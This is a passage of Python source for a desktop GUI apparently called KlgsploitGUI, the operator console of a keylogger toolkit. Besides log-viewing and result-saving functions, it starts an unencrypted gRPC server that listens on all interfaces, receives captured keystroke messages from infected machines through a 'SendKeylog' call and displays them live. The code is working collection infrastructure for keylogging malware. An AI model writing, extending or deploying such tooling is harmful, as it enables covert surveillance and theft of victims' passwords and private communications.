            with open(output_path, 'w', encoding='utf-8') as f:
                json.dump(result, f, indent=2, ensure_ascii=False)

            self.txt_classify_output.insert(END, f"\n{'=' * 50}\n")
            self.txt_classify_output.insert(END, f"[+] Detailed results saved to:\n")
            self.txt_classify_output.insert(END, f"    {output_path}\n")
            self.txt_classify_output.insert(END, f"[+] Alerts saved to: alerts.log\n")

        except ImportError as e:
            self.txt_classify_output.insert(END, f"\n[-] Import Error: {e}\n")
            self.txt_classify_output.insert(END, "[!] Make sure classifier.py is in the same directory\n")
        except Exception as e:
            self.txt_classify_output.insert(END, f"\n[-] Error: {e}\n")
            import traceback
            self.txt_classify_output.insert(END, f"\n{traceback.format_exc()}\n")

    def _refresh_log(self):
        """Refresh the log viewer."""
        filepath = self.var_output_file.get()
        self.txt_log_viewer.delete(1.0, END)

        if os.path.exists(filepath):
            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                self.txt_log_viewer.insert(END, content)
                self.txt_log_viewer.see(END)
            except Exception as e:
                self.txt_log_viewer.insert(END, f"Error reading file: {e}")
        else:
            self.txt_log_viewer.insert(END, f"File not found: {filepath}")

    def _clear_log(self):
        """Clear the log file."""
        filepath = self.var_output_file.get()
        
        if HAS_TTK_BOOTSTRAP:
            result = Messagebox.yesno("Confirm", f"Clear log file?\n{filepath}")
        else:
            result = messagebox.askyesno("Confirm", f"Clear log file?\n{filepath}")
        
        if result:
            try:
                with open(filepath, 'w') as f:
                    f.write("")
                self._refresh_log()
                self._show_info("Cleared", "Log file cleared successfully")
            except Exception as e:
                self._show_error("Error", str(e))

    def _toggle_grpc_server(self):
        """Toggle gRPC server."""
        if self.grpc_server_running:
            self.grpc_server_running = False
            self.btn_grpc_server.config(text="▶ Start gRPC Server")
            if HAS_TTK_BOOTSTRAP:
                self.btn_grpc_server.config(bootstyle="success")
            self.txt_grpc_log.insert(END, "[*] Server stopped\n")
        else:
            try:
                import grpc
                from concurrent import futures
                import protos.server_pb2 as keylog_pb2
                import protos.server_pb2_grpc as keylog_pb2_grpc
            except ImportError as e:
                self._show_error("Import Error", f"Missing dependency: {e}\n\nInstall with: pip install grpcio")
                return

            self.grpc_server_running = True
            self.btn_grpc_server.config(text="⏹ Stop gRPC Server")
            if HAS_TTK_BOOTSTRAP:
                self.btn_grpc_server.config(bootstyle="danger")

            port = self.var_grpc_port.get()
            self.txt_grpc_log.insert(END, f"[+] Starting gRPC server on port {port}...\n")

            gui = self

            class KeylogServer(keylog_pb2_grpc.KeylogServiceServicer):
                def SendKeylog(self, request, context):
                    gui.app.after(0, lambda: gui.txt_grpc_log.insert(END, f"[RECV] {request.message}\n"))
                    gui.app.after(0, lambda: gui.txt_grpc_log.see(END))
                    return keylog_pb2.KeylogResponse(response=True)

            def run_server():
                server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
                keylog_pb2_grpc.add_KeylogServiceServicer_to_server(KeylogServer(), server)
                server.add_insecure_port(f"[::]:{port}")
                server.start()
                gui.app.after(0, lambda: gui.txt_grpc_log.insert(END, f"[+] Server running on [::]:{port}\n"))
                
                while gui.grpc_server_running:
                    time.sleep(1)
                
                server.stop(0)

            threading.Thread(target=run_server, daemon=True).start()

    def _show_error(self, title, message):
        """Show error message."""
        if HAS_TTK_BOOTSTRAP:
            Messagebox.show_error(message, title)
        else:
            messagebox.showerror(title, message)

    def _show_info(self, title, message):
        """Show info message."""
        if HAS_TTK_BOOTSTRAP:
            Messagebox.show_info(message, title)
        else:
            messagebox.showinfo(title, message)

    def run(self):
        """Run the application."""
        self.app.mainloop()


# Main entry point
if __name__ == "__main__":
    app = KlgsploitGUI()
    app.run()
